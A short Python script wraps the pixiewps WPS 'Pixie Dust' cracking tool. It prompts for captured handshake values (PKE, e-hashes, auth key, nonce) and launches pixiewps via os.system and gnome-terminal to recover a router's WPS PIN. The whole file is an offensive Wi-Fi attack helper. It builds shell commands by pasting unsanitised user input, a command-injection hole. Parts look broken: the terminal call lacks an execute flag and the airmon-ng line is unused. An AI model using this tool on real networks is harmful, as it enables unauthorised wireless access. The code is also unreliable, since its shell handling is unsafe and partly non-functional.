import sys
import os
from termcolor import colored
import time


def pixie():
	card = 'airmon-ng start wlan0'
	pke = input('Name Of PKE File:\n> ')
	ehash1 = input('Name Of First e-Hash:\n> ')
	ehash2 = input('Name Of Second e-Hash:\n> ')
	auth = input('Name Of The Auth Key:\n> ')
	nonce = input('Name Of e-Nonce:\n> ')

	run1 = 'pixiewps -e ' + pke + ' -S'
	run2 = 'pixiewps -e ' + pke + ' -s ' + ehash1 + ' -z ' + ehash2 + ' -a ' + auth + ' -n ' + nonce + ' -S'
	gt = 'gnome-terminal ' + run1
	gt2 = 'gnome-terminal ' + run2
	os.system(gt)
	os.system(gt2)


